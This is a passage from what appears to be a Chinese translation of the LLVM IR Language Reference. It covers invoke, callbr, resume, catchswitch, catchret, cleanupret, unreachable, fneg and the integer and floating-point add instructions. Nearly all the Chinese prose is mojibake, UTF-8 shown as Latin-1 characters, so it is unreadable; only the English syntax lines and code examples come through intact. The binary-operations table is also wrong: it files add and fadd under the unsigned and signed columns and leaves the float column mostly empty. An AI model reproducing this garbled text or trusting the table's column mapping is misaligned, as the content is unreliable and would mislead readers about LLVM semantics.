‡ç­¾ä¹Ÿå…·æœ‰æœªå®šä¹‰çš„è¡Œä¸º</li><li>å¦‚æœ<code>address</code>æ˜¯ <code>poison</code> æˆ– <code>undef</code>, åˆ™è¯¥æŒ‡ä»¤å…·æœ‰æœªå®šä¹‰çš„è¡Œä¸ºã€‚</li></ul><p><strong>Implementation:</strong></p><p>è¿™é€šå¸¸é€šè¿‡ä¸€ä¸ªå¯„å­˜å™¨è·³è½¬æ¥å®ç°ã€‚</p><p><strong>Example:</strong></p><pre class="language-none"><code class="language-none">indirectbr i8* %Addr, [ label %bb1, label %bb2, label %bb3 ]</code></pre><h4 id="invoke-æ™®é€š-å¸¦å¼‚å¸¸è°ƒç”¨">invoke æ™®é€š/å¸¦å¼‚å¸¸è°ƒç”¨</h4><p>æ™®é€š/å¸¦å¼‚å¸¸è°ƒç”¨</p><p><strong>Syntax:</strong></p><pre class="language-none"><code class="language-none">&lt;result&gt; &#x3D; invoke [cconv] [ret attrs] [addrspace(&lt;num&gt;)] &lt;ty&gt;|&lt;fnty&gt; &lt;fnptrval&gt;(&lt;function args&gt;) [fn attrs]              [operand bundles] to label &lt;normal label&gt; unwind label &lt;exception label&gt;</code></pre><p><strong>Overview:</strong></p><p>å¦‚æœè¢«è°ƒç”¨å‡½æ•°è¿”å›â€œ<code>ret</code>â€æŒ‡ä»¤ï¼Œæ§åˆ¶æµå°†è¿”å›â€œ<code>normal</code>â€æ ‡ç­¾ã€‚ å¦‚æœè¢«è°ƒç”¨è€…ï¼ˆæˆ–ä»»ä½•é—´æ¥è¢«è°ƒç”¨è€…ï¼‰é€šè¿‡â€œ<a href="https://llvm.org/docs/LangRef.html#i-resume">resume</a>â€æŒ‡ä»¤æˆ–å…¶ä»–å¼‚å¸¸å¤„ç†æœºåˆ¶è¿”å›ï¼Œåˆ™æ§åˆ¶è¢«ä¸­æ–­å¹¶ç»§ç»­åœ¨ åŠ¨æ€æœ€è¿‘çš„â€œ<code>exception</code>â€æ ‡ç­¾ã€‚</p><p><strong>Arguments:</strong></p><p>è¯¥æŒ‡ä»¤éœ€è¦å‡ ä¸ªå‚æ•°ï¼š</p><ol><li>å¯é€‰çš„<code>cconv</code>æ ‡è®°æŒ‡ç¤ºè°ƒç”¨åº”è¯¥ä½¿ç”¨å“ªä¸ª<a href="https://llvm.org/docs/LangRef.html#callingconv">è°ƒç”¨çº¦å®š</a>ã€‚å¦‚æœæœªæŒ‡å®šï¼Œåˆ™è°ƒç”¨é»˜è®¤ä½¿ç”¨ C è°ƒç”¨çº¦å®šã€‚</li><li>è¿”å›å€¼çš„å¯é€‰<a href="https://llvm.org/docs/LangRef.html#paramattrs">å‚æ•°å±æ€§</a>åˆ—è¡¨ã€‚åªæœ‰<code>zeroext</code>,<code>signext</code>å’Œ<code>inreg</code>å±æ€§åœ¨è¿™é‡Œæ˜¯æœ‰æ•ˆçš„ã€‚</li><li>å¯é€‰çš„<code>addrspace</code>å±æ€§å¯ä»¥ç”¨æ¥è¡¨ç¤ºè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€ç©ºé—´ã€‚å¦‚æœæœªæŒ‡å®šï¼Œå°†ä½¿ç”¨ <a href="https://llvm.org/docs/LangRef.html#langref-datalayout">datalayout string</a> ä¸­çš„ç¨‹åºåœ°å€ç©ºé—´ã€‚</li><li><code>ty</code>ï¼šè°ƒç”¨æŒ‡ä»¤æœ¬èº«çš„ç±»å‹ï¼Œä¹Ÿæ˜¯è¿”å›å€¼çš„ç±»å‹ã€‚ä¸è¿”å›å€¼çš„å‡½æ•°è¢«æ ‡è®°ä¸ºâ€œ<code>void</code>â€ã€‚</li><li><code>fnty</code>ï¼šåº”è¯¥æ˜¯è¢«è°ƒç”¨å‡½æ•°çš„ç­¾åã€‚å‚æ•°ç±»å‹å¿…é¡»ä¸æ­¤ç­¾åæ‰€æš—ç¤ºçš„ç±»å‹ç›¸åŒ¹é…ã€‚å¦‚æœå‡½æ•°ä¸æ˜¯å¯å˜å‚æ•°ï¼Œåˆ™å¯ä»¥çœç•¥æ­¤ç±»å‹ã€‚</li><li><code>fnptrval</code>ï¼šä¸€ä¸ª LLVM å€¼ï¼ŒåŒ…å«ä¸€ä¸ªæŒ‡å‘è¦è°ƒç”¨çš„å‡½æ•°çš„æŒ‡é’ˆã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™æ˜¯ä¸€ä¸ªç›´æ¥çš„å‡½æ•°è°ƒç”¨ï¼Œä½†é—´æ¥çš„<code>invoke</code>ä¹Ÿæ˜¯å°½å¯èƒ½çš„ï¼Œè°ƒç”¨ä¸€ä¸ªæŒ‡å‘å‡½æ•°å€¼çš„ä»»æ„æŒ‡é’ˆã€‚</li><li><code>function args</code>ï¼šç±»å‹ä¸å‡½æ•°ç­¾åå‚æ•°ç±»å‹å’Œå‚æ•°å±æ€§åŒ¹é…çš„å‚æ•°åˆ—è¡¨ã€‚æ‰€æœ‰å‚æ•°å¿…é¡»æ˜¯ <a href="https://llvm.org/docs/LangRef.html#t-firstclass">first class</a> ç±»å‹ã€‚å¦‚æœå‡½æ•°ç­¾åè¡¨æ˜å‡½æ•°æ¥å—å¯å˜æ•°é‡çš„å‚æ•°ï¼Œåˆ™å¯ä»¥æŒ‡å®šé¢å¤–çš„å‚æ•°ã€‚</li><li><code>normal label</code>ï¼šè¢«è°ƒç”¨å‡½æ•°æ‰§è¡Œ<code>ret</code>æŒ‡ä»¤æ—¶åˆ°è¾¾çš„æ ‡ç­¾ã€‚</li><li><code>exception label</code>ï¼šè¢«è°ƒç”¨è€…é€šè¿‡<a href="https://llvm.org/docs/LangRef.html#i-resume">resume</a>æŒ‡ä»¤æˆ–å…¶ä»–å¼‚å¸¸å¤„ç†æœºåˆ¶è¿”å›æ—¶åˆ°è¾¾çš„æ ‡ç­¾ã€‚</li><li>å¯é€‰çš„<a href="https://llvm.org/docs/LangRef.html#fnattrs">å‡½æ•°å±æ€§</a>åˆ—è¡¨ã€‚</li><li>å¯é€‰çš„<a href="https://llvm.org/docs/LangRef.html#opbundles">æ“ä½œæ•°åŒ…</a>åˆ—è¡¨ã€‚</li></ol><p><strong>Semantics:</strong></p><p>åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¯¥æŒ‡ä»¤æ—¨åœ¨ä½œä¸ºæ ‡å‡†çš„<code>call</code>æŒ‡ä»¤è¿è¡Œã€‚ ä¸»è¦åŒºåˆ«åœ¨äºå®ƒå»ºç«‹äº†ä¸æ ‡ç­¾çš„å…³è”ï¼Œè¿è¡Œæ—¶åº“ä½¿ç”¨è¯¥æ ‡ç­¾æ¥å±•å¼€å †æ ˆã€‚</p><p><strong>Example:</strong></p><pre class="language-none"><code class="language-none">%retval &#x3D; invoke i32 @Test(i32 15) to label %Continue            unwind label %TestCleanup              ; i32:retval set%retval &#x3D; invoke coldcc i32 %Testfnptr(i32 15) to label %Continue            unwind label %TestCleanup              ; i32:retval set</code></pre><h4 id="callbr-è°ƒç”¨åˆ†æ”¯">callbr è°ƒç”¨åˆ†æ”¯</h4><p><strong>Syntax:</strong></p><pre class="language-none"><code class="language-none">&lt;result&gt; &#x3D; callbr [cconv] [ret attrs] [addrspace(&lt;num&gt;)] &lt;ty&gt;|&lt;fnty&gt; &lt;fnptrval&gt;(&lt;function args&gt;) [fn attrs]              [operand bundles] to label &lt;fallthrough label&gt; [indirect labels]</code></pre><p><strong>Overview:</strong></p><p>â€˜<code>callbr</code>â€™æŒ‡ä»¤ä½¿æ§åˆ¶è½¬ç§»åˆ°æŒ‡å®šçš„å‡½æ•°. å¯ä»¥æ§åˆ¶æµä¼ è¾“åˆ°â€˜<code>fallthrough</code>â€™ æ ‡ç­¾æˆ–<code>indirect</code>â€™æ ‡ç­¾ä¹‹ä¸€ã€‚</p><p><font color='red'>è¯¥æŒ‡ä»¤ä»…ç”¨äºå®ç° gcc æ ·å¼å†…è”æ±‡ç¼–çš„<code>goto</code>ç‰¹æ€§ã€‚ ä»»ä½•å…¶ä»–ç”¨æ³•éƒ½æ˜¯ IR éªŒè¯ç¨‹åºä¸­çš„é”™è¯¯ã€‚</font></p><p><strong>Arguments:</strong></p><p>è¯¥æŒ‡ä»¤éœ€è¦å‡ ä¸ªå‚æ•°ï¼š</p><ol><li><p>å¯é€‰çš„<code>cconv</code>æ ‡è®°æŒ‡ç¤ºè°ƒç”¨åº”è¯¥ä½¿ç”¨å“ªä¸ª<a href="https://llvm.org/docs/LangRef.html#callingconv">è°ƒç”¨çº¦å®š</a>ã€‚å¦‚æœæœªæŒ‡å®šï¼Œåˆ™è°ƒç”¨é»˜è®¤ä½¿ç”¨ C è°ƒç”¨çº¦å®šã€‚</p></li><li><p>è¿”å›å€¼çš„å¯é€‰<a href="https://llvm.org/docs/LangRef.html#paramattrs">å‚æ•°å±æ€§</a>åˆ—è¡¨ã€‚åªæœ‰<code>zeroext</code>,<code>signext</code>å’Œ<code>inreg</code>å±æ€§åœ¨è¿™é‡Œæ˜¯æœ‰æ•ˆçš„ã€‚</p></li><li><p>å¯é€‰çš„<code>addrspace</code>å±æ€§å¯ä»¥ç”¨æ¥è¡¨ç¤ºè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€ç©ºé—´ã€‚å¦‚æœæœªæŒ‡å®šï¼Œå°†ä½¿ç”¨ <a href="https://llvm.org/docs/LangRef.html#langref-datalayout">datalayout string</a> ä¸­çš„ç¨‹åºåœ°å€ç©ºé—´ã€‚</p></li><li><p><code>ty</code>ï¼šè°ƒç”¨æŒ‡ä»¤æœ¬èº«çš„ç±»å‹ï¼Œä¹Ÿæ˜¯è¿”å›å€¼çš„ç±»å‹ã€‚ä¸è¿”å›å€¼çš„å‡½æ•°è¢«æ ‡è®°ä¸ºâ€œ<code>void</code>â€ã€‚</p></li><li><p><code>fnty</code>ï¼šåº”è¯¥æ˜¯è¢«è°ƒç”¨å‡½æ•°çš„ç­¾åã€‚å‚æ•°ç±»å‹å¿…é¡»ä¸æ­¤ç­¾åæ‰€æš—ç¤ºçš„ç±»å‹ç›¸åŒ¹é…ã€‚å¦‚æœå‡½æ•°ä¸æ˜¯å¯å˜å‚æ•°ï¼Œåˆ™å¯ä»¥çœç•¥æ­¤ç±»å‹ã€‚</p></li><li><p><code>fnptrval</code>ï¼šä¸€ä¸ª LLVM å€¼ï¼ŒåŒ…å«ä¸€ä¸ªæŒ‡å‘è¦è°ƒç”¨çš„å‡½æ•°çš„æŒ‡é’ˆã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™æ˜¯ä¸€ä¸ªç›´æ¥çš„å‡½æ•°è°ƒç”¨ï¼Œä½†é—´æ¥çš„<code>invoke</code>ä¹Ÿæ˜¯å°½å¯èƒ½çš„ï¼Œè°ƒç”¨ä¸€ä¸ªæŒ‡å‘å‡½æ•°å€¼çš„ä»»æ„æŒ‡é’ˆã€‚</p></li><li><p>â€˜<code>function args</code>ï¼šç±»å‹ä¸å‡½æ•°ç­¾åå‚æ•°ç±»å‹å’Œå‚æ•°å±æ€§åŒ¹é…çš„å‚æ•°åˆ—è¡¨ã€‚æ‰€æœ‰å‚æ•°å¿…é¡»æ˜¯ <a href="https://llvm.org/docs/LangRef.html#t-firstclass">first class</a> ç±»å‹ã€‚å¦‚æœå‡½æ•°ç­¾åè¡¨æ˜å‡½æ•°æ¥å—å¯å˜æ•°é‡çš„å‚æ•°ï¼Œåˆ™å¯ä»¥æŒ‡å®šé¢å¤–çš„å‚æ•°ã€‚</p></li><li><p>â€˜<code>fallthrough label</code>â€™: å†…è”æ±‡ç¼–æ‰§è¡Œé€€å‡ºåº•éƒ¨æ—¶åˆ°è¾¾çš„æ ‡ç­¾ã€‚</p></li><li><p>â€˜<code>indirect labels</code>â€™: å½“è¢«è°ƒç”¨è€…å°†æ§åˆ¶æƒè½¬ç§»åˆ°<code>fallthrough label</code>ä»¥å¤–çš„ä½ç½®æ—¶åˆ°è¾¾çš„æ ‡ç­¾ã€‚ è¿™äº›çš„å—åœ°å€å¸¸é‡ä¹Ÿåº”è¯¥åœ¨<code>function args</code>åˆ—è¡¨ä¸­ã€‚</p></li><li><p>å¯é€‰çš„<a href="https://llvm.org/docs/LangRef.html#fnattrs">å‡½æ•°å±æ€§</a>åˆ—è¡¨ã€‚</p></li><li><p>å¯é€‰çš„<a href="https://llvm.org/docs/LangRef.html#opbundles">æ“ä½œæ•°åŒ…</a>åˆ—è¡¨ã€‚</p></li></ol><p><strong>Semantics:</strong></p><p>åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¯¥æŒ‡ä»¤æ—¨åœ¨ä½œä¸ºæ ‡å‡†çš„â€œè°ƒç”¨â€æŒ‡ä»¤è¿è¡Œã€‚ ä¸»è¦åŒºåˆ«åœ¨äºå®ƒå»ºç«‹äº†ä¸é™„åŠ æ ‡ç­¾çš„å…³è”ï¼Œä»¥å®šä¹‰æ§åˆ¶æµåœ¨è°ƒç”¨ä¹‹åçš„å»å‘ã€‚</p><p><code>callbr</code>æŒ‡ä»¤çš„è¾“å‡ºå€¼åªå¯¹<code>fallthrough</code>â€™å—æœ‰æ•ˆï¼Œå¯¹ä»»ä½•â€˜<code>indirect</code>â€™å—æ— æ•ˆã€‚</p><p>è¿™æ ·åšçš„å”¯ä¸€ç”¨é€”æ˜¯å®ç° gcc å†…è”æ±‡ç¼–çš„â€œgotoâ€åŠŸèƒ½ï¼Œå…¶ä¸­å¯ä»¥æä¾›é¢å¤–çš„æ ‡ç­¾ä½œä¸ºå†…è”æ±‡ç¼–è·³è½¬åˆ°çš„ä½ç½®ã€‚</p><p><strong>Example:</strong></p><pre class="language-none"><code class="language-none">; &quot;asm goto&quot; without output constraints.callbr void asm &quot;&quot;, &quot;r,X&quot;(i32 %x, i8 *blockaddress(@foo, %indirect))            to label %fallthrough [label %indirect]; &quot;asm goto&quot; with output constraints.&lt;result&gt; &#x3D; callbr i32 asm &quot;&quot;, &quot;&#x3D;r,r,X&quot;(i32 %x, i8 *blockaddress(@foo, %indirect))            to label %fallthrough [label %indirect]</code></pre><h4 id="resume-æŠ›å‡ºå¼‚å¸¸">resume æŠ›å‡ºå¼‚å¸¸</h4><p><strong>æŠ›å‡ºå¼‚å¸¸</strong></p><p><strong>Syntax:</strong></p><pre class="language-none"><code class="language-none">resume &lt;type&gt; &lt;value&gt;</code></pre><p><strong>Overview:</strong></p><p><code>resume</code>æŒ‡ä»¤æ˜¯æ²¡æœ‰åç»§çš„ç»ˆæ­¢æŒ‡ä»¤ã€‚</p><p><strong>Arguments:</strong></p><p>â€œ<code>resume</code>â€æŒ‡ä»¤éœ€è¦ä¸€ä¸ªå‚æ•°ï¼Œè¯¥å‚æ•°å¿…é¡»ä¸åŒä¸€å‡½æ•°ä¸­ä»»ä½•â€œ<code>landingpad</code>â€æŒ‡ä»¤çš„ç»“æœç±»å‹ç›¸åŒã€‚</p><p><strong>Semantics:</strong></p><p><code>resume</code>æŒ‡ä»¤æ¢å¤ä¸€ä¸ªç°æœ‰ï¼ˆè¿›è¡Œä¸­ï¼‰å¼‚å¸¸çš„ä¼ æ’­ï¼Œè¯¥å¼‚å¸¸çš„å±•å¼€è¢« <a href="https://llvm.org/docs/LangRef.html#i-landingpad">landingpad</a> æŒ‡ä»¤ä¸­æ–­ã€‚</p><p><strong>Example:</strong></p><pre class="language-none"><code class="language-none">resume &#123; i8*, i32 &#125; %exn</code></pre><h4 id="catchswitch-å¼‚å¸¸å¤„ç†">catchswitch å¼‚å¸¸å¤„ç†</h4><p>LLVMå¼‚å¸¸å¤„ç†</p><p><strong>Syntax:</strong></p><pre class="language-none"><code class="language-none">&lt;resultval&gt; &#x3D; catchswitch within &lt;parent&gt; [ label &lt;handler1&gt;, label &lt;handler2&gt;, ... ] unwind to caller&lt;resultval&gt; &#x3D; catchswitch within &lt;parent&gt; [ label &lt;handler1&gt;, label &lt;handler2&gt;, ... ] unwind label &lt;default&gt;</code></pre><p><strong>Overview:</strong></p><p><a href="https://llvm.org/docs/ExceptionHandling.html#overview">LLVM çš„å¼‚å¸¸å¤„ç†ç³»ç»Ÿ</a> ä½¿ç”¨ â€˜<code>catchswitch</code>â€™ æŒ‡ä»¤æ¥æè¿°å¯èƒ½ç”± <a href="https://llvm.org/docs/LangRef.html#personalityfn">EH ç‰¹æ€§æ‰§è¡Œçš„æ•è·å¤„ç†ç¨‹åºé›† ä¾‹ç¨‹</a>ã€‚</p><p><strong>Arguments:</strong></p><p><code>parent</code> å‚æ•°æ˜¯åŒ…å« <code>catchswitch</code> æŒ‡ä»¤çš„ funclet çš„æ ‡è®°ã€‚ å¦‚æœ <code>catchswitch</code> ä¸åœ¨ funclet å†…ï¼Œåˆ™æ­¤æ“ä½œæ•°å¯èƒ½æ˜¯æ ‡è®° <code>none</code>ã€‚</p><p><code>default</code> å‚æ•°æ˜¯å¦ä¸€ä¸ªä»¥ <code>cleanuppad</code> æˆ– <code>catchswitch</code> æŒ‡ä»¤å¼€å¤´çš„åŸºæœ¬å—çš„æ ‡ç­¾ã€‚ å¦‚ <a href="https://llvm.org/docs/ExceptionHandling.html#wineh-constraints">å¼‚å¸¸å¤„ç†æ–‡æ¡£</a> ä¸­æ‰€è¿°ï¼Œæ­¤å±•å¼€ç›®æ ‡å¿…é¡»æ˜¯ä¸â€œ<code>parent</code>â€é“¾æ¥ç›¸å…³çš„åˆæ³•ç›®æ ‡ã€‚</p><p><code>handlers</code> æ˜¯ä¸€ä¸ªåç»§å—çš„éç©ºåˆ—è¡¨ï¼Œæ¯ä¸ªåç»§å—éƒ½ä»¥ <a href="https://llvm.org/docs/LangRef.html#i-catchpad">catchpad</a> æŒ‡ä»¤å¼€å¤´ã€‚</p><p><strong>Semantics:</strong></p><p>æ‰§è¡Œæ­¤æŒ‡ä»¤å°†æ§åˆ¶æƒè½¬ç§»åˆ°<code>handlers</code>ä¸­çš„åç»§è€…ä¹‹ä¸€ï¼Œ å¦‚æœåˆé€‚ï¼Œæˆ–é€šè¿‡å±•å¼€æ ‡ç­¾ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ç»§ç»­å±•å¼€ã€‚</p><p><code>catchswitch</code> æ—¢æ˜¯ç»ˆæ­¢ç¬¦åˆæ˜¯ â€œ<code>pad</code>â€ æŒ‡ä»¤ï¼Œè¿™æ„å‘³ç€å®ƒå¿…é¡»æ˜¯åŸºæœ¬å—ä¸­çš„ç¬¬ä¸€æ¡é phi æŒ‡ä»¤å’Œæœ€åä¸€æ¡æŒ‡ä»¤ã€‚ å› æ­¤ï¼Œå®ƒå¿…é¡»æ˜¯å—ä¸­å”¯ä¸€çš„é phi æŒ‡ä»¤ã€‚</p><p><strong>Example:</strong></p><pre class="language-none"><code class="language-none">dispatch1:  %cs1 &#x3D; catchswitch within none [label %handler0, label %handler1] unwind to callerdispatch2:  %cs2 &#x3D; catchswitch within %parenthandler [label %handler0] unwind label %cleanup</code></pre><h4 id="catchret-å¤„ç†è¿”å›">catchret å¤„ç†è¿”å›</h4><p><strong>Syntax:</strong></p><pre class="language-none"><code class="language-none">catchret from &lt;token&gt; to label &lt;normal&gt;</code></pre><p><strong>Overview:</strong></p><p><code>catchret</code>æŒ‡ä»¤æ˜¯å…·æœ‰å•ä¸ªåç»§çš„ç»ˆæ­¢æŒ‡ä»¤ã€‚</p><p><strong>Arguments:</strong></p><p>The first argument to a â€˜<code>catchret</code>â€™ indicates which <code>catchpad</code> it exits. It must be a <a href="https://llvm.org/docs/LangRef.html#i-catchpad">catchpad</a>. The second argument to a â€˜<code>catchret</code>â€™ specifies where control will transfer to next.</p><p>â€˜<code>catchret</code>â€™ çš„ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡ç¤ºå®ƒé€€å‡ºå“ªä¸ª <code>catchpad</code>ã€‚ å®ƒå¿…é¡»æ˜¯ <a href="https://llvm.org/docs/LangRef.html#i-catchpad">catchpad</a>ã€‚ â€˜<code>catchret</code>â€™ çš„ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šæ§åˆ¶å°†è½¬ç§»åˆ°ä¸‹ä¸€ä¸ªä½ç½®ã€‚</p><p><strong>Semantics:</strong></p><p>â€˜<code>catchret</code>â€™ æŒ‡ä»¤ç»“æŸä¸€ä¸ªç°æœ‰çš„ï¼ˆæ­£åœ¨è¿›è¡Œçš„ï¼‰å¼‚å¸¸ï¼Œå…¶å±•å¼€è¢« <a href="https://llvm.org/docs/LangRef.html#i-catchpad">catchpad</a> æŒ‡ä»¤ä¸­æ–­ã€‚ <a href="https://llvm.org/docs/LangRef.html#personalityfn">personality function</a> æœ‰æœºä¼šæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é”€æ¯æ´»åŠ¨å¼‚å¸¸ã€‚ ç„¶åæ§åˆ¶è½¬ç§»åˆ° <code>normal</code>.</p><p><code>token</code> å‚æ•°å¿…é¡»æ˜¯ç”± <code>catchpad</code> æŒ‡ä»¤ç”Ÿæˆçš„æ ‡è®°ã€‚ å¦‚æœæŒ‡å®šçš„ <code>catchpad</code> ä¸æ˜¯æœ€è¿‘è¾“å…¥çš„å°šæœªé€€å‡ºçš„ funclet padï¼ˆå¦‚ <a href="https://llvm.org/docs/ExceptionHandling.html#wineh-constraints">EH æ–‡æ¡£</a> ä¸­æ‰€è¿°ï¼‰ , <code>catchret</code> çš„è¡Œä¸ºæ˜¯æœªå®šä¹‰çš„ã€‚</p><p><strong>Example:</strong></p><pre class="language-none"><code class="language-none">catchret from %catch to label %continue</code></pre><h4 id="cleanupret">cleanupret</h4><p><strong>Syntax:</strong></p><pre class="language-none"><code class="language-none">cleanupret from &lt;value&gt; unwind label &lt;continue&gt;cleanupret from &lt;value&gt; unwind to caller</code></pre><p><strong>Overview</strong></p><p><code>cleanupret</code>æŒ‡ä»¤æ˜¯å…·æœ‰å¯é€‰åç»§çš„ç»ˆæ­¢æŒ‡ä»¤ã€‚</p><p><strong>Arguments:</strong></p><p><code>cleanupret</code> æŒ‡ä»¤éœ€è¦ä¸€ä¸ªå‚æ•°ï¼ŒæŒ‡ç¤ºå®ƒé€€å‡ºå“ªä¸ª <code>cleanuppad</code>ï¼Œå¹¶ä¸”å¿…é¡»æ˜¯ <a href="https://llvm.org/docs/LangRef.html#i-cleanuppad">cleanuppad</a>ã€‚ å¦‚æœæŒ‡å®šçš„ <code>cleanuppad</code> ä¸æ˜¯æœ€è¿‘è¿›å…¥çš„å°šæœªé€€å‡ºçš„ funclet padï¼ˆå¦‚ <a href="https://llvm.org/docs/ExceptionHandling.html#wineh-constraints">EH æ–‡æ¡£</a> ä¸­æ‰€è¿°ï¼‰ , <code>cleanupret</code> çš„è¡Œä¸ºæ˜¯æœªå®šä¹‰çš„ã€‚</p><p>The â€˜<code>cleanupret</code>â€™ instruction also has an optional successor, <code>continue</code>, which must be the label of another basic block beginning with either a <code>cleanuppad</code> or <code>catchswitch</code> instruction. This unwind destination must be a legal target with respect to the <code>parent</code> links, as described in the <a href="https://llvm.org/docs/ExceptionHandling.html#wineh-constraints">exception handling documentation</a>.</p><p><code>cleanupret</code>æŒ‡ä»¤è¿˜æœ‰ä¸€ä¸ªå¯é€‰çš„åç»§æŒ‡ä»¤<code>continue</code>ï¼Œå®ƒå¿…é¡»æ˜¯å¦ä¸€ä¸ªä»¥<code>cleanuppad</code>æˆ–<code>catchswitch</code>æŒ‡ä»¤å¼€å¤´çš„åŸºæœ¬å—çš„æ ‡ç­¾ã€‚ å¦‚ <a href="https://llvm.org/docs/ExceptionHandling.html#wineh-constraints">å¼‚å¸¸å¤„ç†æ–‡æ¡£</a> ä¸­æ‰€è¿°ï¼Œæ­¤å±•å¼€ç›®æ ‡å¿…é¡»æ˜¯ä¸<code>parent</code>é“¾æ¥ç›¸å…³çš„åˆæ³•ç›®æ ‡ã€‚</p><p><strong>Semantics:</strong></p><p><code>cleanupret</code>æŒ‡ä»¤å‘ <a href="https://llvm.org/docs/LangRef.html#personalityfn">personality function</a> æŒ‡ç¤ºä¸€ä¸ª [cleanuppad](<a href="https://llvm.org/docs/LangRef.html">https://llvm.org/docs/LangRef.html</a> #i-cleanuppad) å°†æ§åˆ¶æƒè½¬ç§»åˆ°å·²ç»“æŸã€‚ å®ƒå°†æ§åˆ¶è½¬ç§»åˆ°<code>continue</code>æˆ–é€€å‡ºå‡½æ•°ã€‚</p><p><strong>Example:</strong></p><pre class="language-none"><code class="language-none">cleanupret from %cleanup unwind to callercleanupret from %cleanup unwind label %continue</code></pre><h4 id="unreachable-ä¸å¯åˆ°è¾¾">unreachable ä¸å¯åˆ°è¾¾</h4><p>ä¸å¯åˆ°è¾¾</p><p><strong>Syntax:</strong></p><pre class="language-none"><code class="language-none">unreachable</code></pre><p><strong>Overview:</strong></p><p><code>unreachable</code>æŒ‡ä»¤æ²¡æœ‰å®šä¹‰çš„è¯­ä¹‰ã€‚ è¯¥æŒ‡ä»¤ç”¨äºé€šçŸ¥ä¼˜åŒ–å™¨ä»£ç çš„ç‰¹å®šéƒ¨åˆ†ä¸å¯è®¿é—®ã€‚ è¿™å¯ä»¥ç”¨æ¥è¡¨ç¤ºæ— æ³•åˆ°è¾¾æ— è¿”å›å‡½æ•°ä¹‹åçš„ä»£ç ï¼Œä»¥åŠå…¶ä»–äº‹å®ã€‚</p><h3 id="ä¸€å…ƒæ“ä½œ-Unary-Operations">ä¸€å…ƒæ“ä½œ (<a href="https://llvm.org/docs/LangRef.html#id1810">Unary Operations</a>)</h3><h4 id="fneg-æ±‚é€†">fneg æ±‚é€†</h4><p>æ±‚é€†</p><p><strong>Syntax:</strong></p><pre class="language-none"><code class="language-none">&lt;result&gt; &#x3D; fneg [fast-math flags]* &lt;ty&gt; &lt;op1&gt;   ; yields ty:result</code></pre><p><strong>Arguments:</strong></p><p><code>fneg</code>æŒ‡ä»¤çš„å‚æ•°å¿…é¡»æ˜¯ <a href="https://llvm.org/docs/LangRef.html#t-floating">floating-point</a> æˆ– [vector](<a href="https://llvm.org/">https://llvm.org/</a> docs/LangRef.html#t-vector) çš„æµ®ç‚¹å€¼ã€‚</p><ul><li><code>&lt;ty&gt; &lt;op1&gt;</code>æ˜¯æ“ä½œæ•°ç±»å‹ï¼Œå¿…é¡»æ˜¯æµ®ç‚¹ç±»å‹æˆ–è€…æµ®ç‚¹å‘é‡ã€‚</li></ul><p><strong>Semantics:</strong></p><p>äº§ç”Ÿçš„å€¼æ˜¯æ“ä½œæ•°çš„å‰¯æœ¬ï¼Œå…¶ç¬¦å·ä½è¢«ç¿»è½¬ã€‚ è¯¥æŒ‡ä»¤è¿˜å¯ä»¥é‡‡ç”¨ä»»æ„æ•°é‡çš„ <a href="https://llvm.org/docs/LangRef.html#fastmath">fast-math flags</a>ï¼Œå®ƒä»¬æ˜¯å¯ç”¨å…¶ä»–ä¸å®‰å…¨æµ®ç‚¹ä¼˜åŒ–çš„ä¼˜åŒ–æç¤ºï¼š</p><p><strong>Example:</strong></p><pre class="language-none"><code class="language-none">&lt;result&gt; &#x3D; fneg float %val          ; yields float:result &#x3D; -%var</code></pre><h3 id="äºŒè¿›åˆ¶æ“ä½œæŒ‡ä»¤-Binary-Operations">äºŒè¿›åˆ¶æ“ä½œæŒ‡ä»¤(<a href="https://llvm.org/docs/LangRef.html#id1817">Binary Operations</a>)</h3><table><thead><tr><th>è¿ç®—\ç±»å‹</th><th>æ— ç¬¦å·æ•´æ•°</th><th>å¸¦ç¬¦å·æ•´æ•°</th><th>æµ®ç‚¹æ•°</th></tr></thead><tbody><tr><td>+</td><td>add</td><td>fadd</td><td></td></tr><tr><td>-</td><td>sub</td><td>fsub</td><td></td></tr><tr><td>*</td><td>mul</td><td>fmul</td><td></td></tr><tr><td>/</td><td>udiv</td><td>sdiv</td><td>fdiv</td></tr><tr><td>%</td><td>urem</td><td>srem</td><td>frem</td></tr></tbody></table><h4 id="add-åŠ ">add   åŠ </h4><p><code>nuw</code> å’Œ <code>nsw</code> åˆ†åˆ«ä»£è¡¨<code>No Unsigned Wrap</code>å’Œ<code>No Signed Wrap</code>ã€‚ å¦‚æœå­˜åœ¨ <code>nuw</code> æˆ–<code>nsw</code>å…³é”®å­—ï¼Œåˆ™å¦‚æœåˆ†åˆ«å‘ç”Ÿæ— ç¬¦å·æˆ–æœ‰ç¬¦å·æº¢å‡ºï¼Œåˆ™ add çš„ç»“æœå€¼æ˜¯ <a href="https://llvm.org/docs/LangRef.html#poisonvalues">poison value</a> ï¼ˆé”™è¯¯å€¼)</p><ul><li><code>&lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;</code>ï¼Œä¸¤ä¸ªæ“ä½œæ•°çš„ç±»å‹ç›¸åŒä¸”å¿…é¡»æ˜¯æ•´å‹ç±»å‹æˆ–è€…æ•´å‹å‘é‡ã€‚</li></ul><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; add &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;          ; yields ty:result&lt;result&gt; &#x3D; add nuw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;      ; yields ty:result&lt;result&gt; &#x3D; add nsw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;      ; yields ty:result&lt;result&gt; &#x3D; add nuw nsw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;  ; yields ty:result#example&lt;result&gt; &#x3D; add i32 4, %var          ; yields i32:result &#x3D; 4 + %var</code></pre><h4 id="fadd-æµ®ç‚¹åŠ ">fadd  æµ®ç‚¹åŠ </h4><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; fadd [fast-math flags]* &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;   ; yields ty:result#example&lt;result&gt; &#x3D; 